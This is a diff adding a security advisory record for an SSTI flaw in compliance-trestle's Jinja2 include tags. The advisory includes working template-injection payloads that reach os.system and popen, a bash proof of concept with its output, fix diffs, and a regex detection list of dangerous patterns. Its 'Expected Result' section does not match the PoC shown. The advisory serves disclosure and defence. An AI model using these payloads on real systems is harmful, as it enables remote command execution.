@@ -1,0 +1,200 @@
+{
+  "id": "GHSA-jw39-3688-r4rx",
+  "modified": "2026-08-28T16:30:06.551879375Z",
+  "published": "2026-08-28T16:15:38Z",
+  "aliases": [
+    "CVE-2026-54757"
+  ],
+  "summary": "Trestle has Server-Side Template Injection (SSTI) via Recursive Template Re-evaluation of Untrusted Data",
+  "details": "### Impact\n\nA Server-Side Template Injection (SSTI) vulnerability exists in multiple locations of trestle's Jinja2 rendering pipeline due to a systemic pattern: **untrusted data is re-parsed as Jinja2 template source code without sandboxing**. This advisory tracks the root cause across all affected code paths.\n\nThe core anti-pattern is: treating runtime data (rendered output, included Markdown content, LUT values) as Jinja2 template source code and passing it to `Parser.parse()` or an equivalent rendering cycle, without using `SandboxedEnvironment` or escaping Jinja2 syntax delimiters. Because `jinja2.Environment` (not `SandboxedEnvironment`) is used, injected expressions can traverse Python object chains (`__class__.__mro__`, `__globals__`, `__subclasses__()`) to achieve arbitrary command execution via `os.system()` or `subprocess`.\n\n**Previously fixed instance (historical context):**\n\nAn earlier version of `render_template()` in `trestle/core/commands/author/jinja.py` implemented a recursive `while` loop: rendered output was loaded via `DictLoader` into a new `Environment` and re-rendered until convergence. This allowed an attacker to inject `{{ namespace.__init__.__globals__.os.system('command') }}` into SSP data fields or LUT YAML values. When a trusted template rendered these data fields (e.g., `Title: {{ ssp.metadata.title }}`), the injected payload was written into the output, then re-evaluated as executable Jinja2 code in the next loop iteration. **This specific code path was fixed — `render_template()` now performs a single `template.render(**lut)` call.\n\n**Still-vulnerable code paths (this advisory):**\n\n1. **`MDCleanInclude.parse()`** — `trestle/core/jinja/tags.py:148-151`: Markdown file content is loaded via `FileSystemLoader.get_source()`, then re-parsed as Jinja2 source via `Parser(self.environment, content).parse()`.\n\n2. **`MDSectionInclude.parse()`** — `trestle/core/jinja/tags.py:100-103`: Extracted Markdown section text (`md_section.content.raw_text`) is re-parsed as Jinja2 source via `Parser(self.environment, raw_text).parse()`.\n\n3. **`MDDatestamp.parse()`** — `trestle/core/jinja/tags.py:198-201`: Date string is re-parsed; lower risk because the date string is internally generated from `strftime()` rather than user input.\n\nAll three paths share the identical root cause: data that should be treated as plain text is passed to `Parser.parse()` and executed as Jinja2 code in an un-sandboxed `Environment`.\n\n**Attack vectors:**\n\n- **Path A (Markdown include):** Attacker places a malicious `.md` file with embedded Jinja2 payload in the trestle workspace. When `{% md_clean_include \"malicious.md\" %}` or `{% mdsection_include %}` is processed, the payload executes.\n- **Path B (Data field injection — SSP/LUT):** Attacker crafts an SSP document or YAML LUT where a data field value (e.g., `metadata.title`) contains `{{ namespace.__init__.__globals__.os.system('id') }}`. When rendered into a trusted template, if the output subsequently flows through any re-parsing code path, the payload executes.\n\nThe same `__globals__.os.system()` RCE technique demonstrated in the previously-fixed `render_template` vulnerability applies to the remaining re-parsing paths.\n\n\n### Workarounds\n\n1. **Disable vulnerable tags:** Remove `MDCleanInclude` and `MDSectionInclude` from the Jinja2 extensions list in `trestle/core/jinja/ext.py:32` if markdown includes are not required.\n2. **Audit included Markdown files:** Review all Markdown files referenced by `{% md_clean_include %}` and `{% mdsection_include %}` tags for unexpected Jinja2 syntax (`{{ }}`, `{% %}`, `{# #}`).\n3. **Scan data sources:** Scan SSP documents, YAML LUT files, and any other data sources rendered into templates for Jinja2 syntax patterns.\n4. **Restrict workspace write access:** Ensure only trusted users can add or modify files in trestle workspace directories.\n5. **Pre-commit hook:** Add a pre-commit hook to scan `.md`, `.json`, `.yaml` files for Jinja2 syntax patterns (`{{ namespace`, `{% for`, `__globals__`, `__class__`, `__mro__`, `__subclasses__`, `os.system`, `subprocess`) and block commits containing them.\n6. **CI/CD isolation:** If trestle is used in automated pipelines processing third-party vendor-supplied SSPs or data, run it in an isolated container/sandbox with minimal privileges and no network access.\n\n## Attack Path (Validation Evidence)\n\n### Path A: via `{% md_clean_include %}` tag\n\n```\n[Entry Point] CLI: trestle jinja -i template.md.jinja -o output.md\n    ↓ main() → JinjaCmd._run(args)  [trestle/core/commands/author/jinja.py:108]\n    ↓\n[Setup] JinjaCmd.jinja_ify(trestle_root, input_path, ...)  [jinja.py:178]\n    ↓ jinja_env = JinjaCmd._create_jinja_environment(template_folder)  [jinja.py:192]\n    ↓ template = jinja_env.get_template(str(r_input_file))  [jinja.py:193]\n    ↓ output = JinjaCmd.render_template(template, lut, template_folder)  [jinja.py:225]\n    ↓\n[Render] Jinja2 engine encounters {% md_clean_include \"malicious.md\" %}\n    ↓\n[Tag Handler] MDCleanInclude.parse(parser)  [tags.py:115]\n    ↓ markdown_source = \"malicious.md\"  [tags.py:127]\n    ↓ self.environment.loader.get_source(self.environment, \"malicious.md\")  [tags.py:139]\n    ↓    ← Loads file content from workspace directory (no restrictions on content)\n    ↓ frontmatter.loads(md_content) → fm.content  [tags.py:140-141]\n    ↓    ← NO SANITIZATION: Markdown body assigned directly to content variable\n[SINK] local_parser = Parser(self.environment, content)  [tags.py:148]\n    ↓    ← Markdown content parsed as Jinja2 template SOURCE CODE\n[SINK] top_level_output = local_parser.parse()  [tags.py:149]\n    ↓    ← ALL Jinja2 syntax in the .md file is EXECUTED\n[Impact] SSTI — attacker-controlled Jinja2 code executes in template context\n```\n\n### Path B: via `{% mdsection_include %}` tag\n\n```\n[Entry Point] Same as Path A\n    ↓ Jinja2 engine encounters {% mdsection_include \"doc.md\" \"Section Title\" %}\n    ↓\n[Tag Handler] MDSectionInclude.parse(parser)  [tags.py:56]\n    ↓ self.environment.loader.get_source(..., markdown_source.value)  [tags.py:82]\n    ↓ DocsMarkdownNode.build_tree_from_markdown(fm.content.split('\\n'))  [tags.py:86]\n    ↓ full_md.get_node_for_key(section_title.value) → md_section  [tags.py:87]\n    ↓    ← Extracts specific section from the markdown document\n[SINK] local_parser = Parser(self.environment, md_section.content.raw_text)  [tags.py:100]\n    ↓    ← Section raw text parsed as Jinja2 template SOURCE CODE\n[SINK] top_level_output = local_parser.parse()  [tags.py:101]\n    ↓    ← ALL Jinja2 syntax in the extracted section is EXECUTED\n[Impact] SSTI — same impact as Path A, limited to a specific markdown section\n```\n\n## Taint Flow (Validation Evidence)\n\n```\nSource: User-supplied .md file in trestle workspace (file system)\n  Type: Markdown text file\n  Controllability: FULL — attacker controls entire file content\n    ↓\n[Transform 1] FileSystemLoader.get_source()  [tags.py:82 or 139]\n  Reads raw file content as string\n  ✓ SANITIZATION: NONE — any content is loaded\n    ↓\n[Transform 2] frontmatter.loads(md_content)  [tags.py:83 or 140]\n  Strips YAML frontmatter, preserves Markdown body\n  ✓ SANITIZATION: NONE — only processes YAML header, ignores body content\n    ↓\n[Transform 3] fm.content → content variable  [tags.py:141] (Path A)\n               OR md_section.content.raw_text  [tags.py:100] (Path B)\n  Direct string assignment\n  ✓ SANITIZATION: NONE — no filtering, encoding, or validation\n    ↓\n[Transform 4] adjust_heading_level(content, expected)  [tags.py:146] (Path A only)\n  Adjusts Markdown heading levels (e.g., ## → ###)\n  ✓ SANITIZATION: NONE — only modifies '#' character count, does not touch Jinja2 syntax\n    ↓\n[Sink] Parser(self.environment, tainted_string)  [tags.py:100 or 148]\n  Tainted Markdown content is passed to Jinja2 Parser constructor as template source\n[Sink] local_parser.parse()  [tags.py:101 or 149]\n  All Jinja2 constructs ({{ }}, {% %}, {# #}) in tainted content are executed\n    ↓\n[Impact] SSTI — Jinja2 code from attacker-controlled Markdown file executes in template context\n\nSanitization Verdict: ABSENT\n  - No sandboxing: jinja2.Environment used (not SandboxedEnvironment)\n  - No syntax filtering: Jinja2 delimiters {{, {%, {# are NOT escaped\n  - No content validation: Markdown body is not scanned for template syntax\n  - autoescape=True is irrelevant: only affects HTML output encoding, not code execution\n```\n\n## Proof of Concept\n\n### Setup\n\n```bash\n# Initialize trestle workspace\ntrestle init\n\n# Create malicious markdown file with Jinja2 payload\ncat \u003e malicious.md \u003c\u003c 'EOF'\n---\nyaml_header: ignored\n---\n\n# Compliance Documentation\n\nTesting SSTI vulnerability:\nExecute command: {{ ssp.__class__.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }}\nEOF\n\n# Create trigger template\ncat \u003e trigger.md.jinja \u003c\u003c 'EOF'\n# POC: SSTI via md_clean_include tag\n\n{% md_clean_include \"malicious.md\" %}\nEOF\n\n# Create a dummy LUT file\ncat \u003e empty.yaml \u003c\u003c 'EOF'\nlut:\n  api_key: super_secret_token_12345\n  db_password: P@ssw0rd_2024\n  jwt_secret: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\n  aws_access_key: AKIAIOSFODNN7EXAMPLE\n  aws_secret_key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n  internal_api: https://internal.corp.example.com/api/v2/users\nEOF\n```\n\n### Execution\n\n```bash\ntrestle init\ntrestle author jinja -i trigger.md.jinja -o output.md -lut empty.yaml\n```\n\n### Observed Output\n\n```markdown\n# POC: SSTI via md_clean_include tag\n\n# Compliance Documentation\n\nTesting SSTI vulnerability:\nExecute command: root\n\n```\n\n### Expected Result\n\nThe rendered `output.md` will contain the output of the `{% for %}` loop, revealing all key-value pairs from the `lut` template context dictionary. If the commented-out object traversal line is uncommented, Python internal objects may be accessible depending on the Jinja2 version and configuration.\n\n\n## Affected Component\n\n- **File:** `trestle/core/jinja/tags.py`\n- **Class:** `MDCleanInclude` (lines 106-151)\n- **Class:** `MDSectionInclude` (lines 47-103)\n- **Function:** `MDCleanInclude.parse()` (line 115), `MDSectionInclude.parse()` (line 56)\n- **Configuring module:** `trestle/core/commands/author/jinja.py`, method `_create_jinja_environment()` (line 304)\n- **Dependency:** Jinja2 (any version) — the vulnerability is in application code, not the Jinja2 library\n\n## Fix Recommendation\n\n\u003e **Important:** The fix for `render_template()` (removing the recursive `while` loop) was a necessary first step, but is **not sufficient**. The same root cause exists in the custom Jinja2 tags. A comprehensive fix must address ALL code paths where data is re-parsed as Jinja2 template source.\n\n### Comprehensive Fix Strategy\n\n**Step 1 (Root cause fix):** Remove all secondary Jinja2 parsing from custom tags where it is not needed:\n\n```diff\n# tags.py: MDCleanInclude.parse() — replace lines 148-151:\n- local_parser = Parser(self.environment, content)\n- top_level_output = local_parser.parse()\n- return top_level_output.body\n+ from jinja2 import nodes\n+ return [nodes.Output([nodes.TemplateData(content)])]\n```\n\n```diff\n# tags.py: MDSectionInclude.parse() — replace lines 100-103:\n- local_parser = Parser(self.environment, md_section.content.raw_text)\n- top_level_output = local_parser.parse()\n- return top_level_output.body\n+ from jinja2 import nodes\n+ return [nodes.Output([nodes.TemplateData(md_section.content.raw_text)])]\n```\n\n**Step 2 (Defense in depth):** Switch to `SandboxedEnvironment` in `_create_jinja_environment()`:\n\n```diff\n# jinja.py:304-308 — _create_jinja_environment()\n+ from jinja2.sandbox import SandboxedEnvironment\n- return Environment(\n+ return SandboxedEnvironment(\n      loader=FileSystemLoader(template_folder),\n      extensions=extensions(),\n      trim_blocks=True,\n      autoescape=True\n  )\n```\n\n**Step 3 (Input validation):** Add validation to reject input data containing Jinja2 syntax:\n\n```python\n# jinja.py: add to _run() before rendering\n_JINJA2_DANGEROUS_PATTERNS = [\n    r'\\{\\{.*__globals__',\n    r'\\{\\{.*__class__',\n    r'\\{\\{.*__mro__',\n    r'\\{\\{.*__subclasses__',\n    r'\\{\\{.*__init__',\n    r'\\{\\{.*os\\.system',\n    r'\\{\\{.*subprocess',\n    r'\\{%\\s*for\\s',\n    r'\\{%\\s*if\\s',\n]\n\ndef _validate_data_field(value: str) -\u003e bool:\n    \"\"\"Reject data values containing suspicious Jinja2 syntax.\"\"\"\n    for pattern in _JINJA2_DANGEROUS_PATTERNS:\n        if re.search(pattern, value):\n            return False\n    return True\n```\n\n### Alternative Fix (Milder): Escape Jinja2 syntax in untrusted data\n\n```diff\n  # tags.py: before any secondary parsing\n+ import re\n+ def escape_jinja2(text: str) -\u003e str:\n+     return re.sub(r'(\\{\\{|\\{%|\\{#)', r'\\\\\\1', text)\n+\n+ content = escape_jinja2(content)  # apply before Parser()\n  local_parser = Parser(self.environment, content)\n```",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "compliance-trestle",
+        "purl": "pkg:pypi/compliance-trestle"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "3.12.4"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.0.2",
+        "0.0.3",
+        "0.1.0",
+        "0.1.1",
+        "0.10.0",
+        "0.11.0",
+        "0.12.0",
+        "0.13.0",
+        "0.13.1",
+        "0.14.0",
+        "0.14.1",
+        "0.14.2",
+        "0.14.3",
+        "0.14.4",
+        "0.15.0",
+        "0.15.1",
+        "0.16.0",
+        "0.17.0",
+        "0.18.0",
+        "0.18.1",
+        "0.19.0",
+        "0.2.0",
+        "0.2.1",
+        "0.2.2",
+        "0.20.0",
+        "0.21.0",
+        "0.22.0",
+        "0.22.1",
+        "0.23.0",
+        "0.24.0",
+        "0.25.0",
+        "0.25.1",
+        "0.26.0",
+        "0.27.0",
+        "0.27.1",
+        "0.27.2",
+        "0.28.0",
+        "0.28.1",
+        "0.29.0",
+        "0.3.0",
+        "0.30.0",
+        "0.31.0",
+        "0.32.0",
+        "0.32.1",
+        "0.33.0",
+        "0.34.0",
+        "0.35.0",
+        "0.36.0",
+        "0.37.0",
+        "0.4.0",
+        "0.5.0",
+        "0.6.0",
+        "0.6.1",
+        "0.6.2",
+        "0.7.0",
+        "0.7.1",
+        "0.7.2",
+        "0.8.0",
+        "0.8.1",
+        "0.9.0",
+        "1.0.0rc0",
+        "1.0.1",
+        "1.0.2",
+        "1.1.0",
+        "1.2.0",
+        "2.0.0",
+        "2.1.0",
+        "2.1.1",
+        "2.2.0",
+        "2.2.1",
+        "2.3.0",
+        "2.3.1",
+        "2.4.0",
+        "2.5.0",
+        "2.5.1",
+        "2.6.0",
+        "2.6.1",
+        "3.0.1",
+        "3.1.0",
+        "3.10.2",
+        "3.10.3",
+        "3.10.4",
+        "3.11.0",
+        "3.12.0",
+        "3.12.1",
+        "3.12.2",
+        "3.12.3",
+        "3.2.0",
+        "3.3.0",
+        "3.4.0",
+        "3.5.0",
+        "3.6.0",
+        "3.7.0",
+        "3.8.0",
+        "3.8.1",
+        "3.9.0",
+        "3.9.1",
+        "3.9.2",
+        "3.9.3"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 3.12.3",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-jw39-3688-r4rx/GHSA-jw39-3688-r4rx.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "compliance-trestle",
+        "purl": "pkg:pypi/compliance-trestle"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "4.0.0"
+            },
+            {
+              "fixed": "4.1.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "4.0.0",
+        "4.0.1",
+        "4.0.2",
+        "4.0.3"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-jw39-3688-r4rx/GHSA-jw39-3688-r4rx.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/oscal-compass/compliance-trestle/security/advisories/GHSA-jw39-3688-r4rx"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-54757"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/oscal-compass/compliance-trestle/pull/2257"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/oscal-compass/compliance-trestle/commit/0f82d19bd42f9cc0f1b3acd7fc3f6dafe3b6ae10"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/oscal-compass/compliance-trestle/commit/5335ff873a2a68eb7de43df029bea09cadff22fd"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/oscal-compass/compliance-trestle"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/oscal-compass/compliance-trestle/releases/tag/v3.12.4"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/oscal-compass/compliance-trestle/releases/tag/v4.1.0"
+    }
+  ]
+}
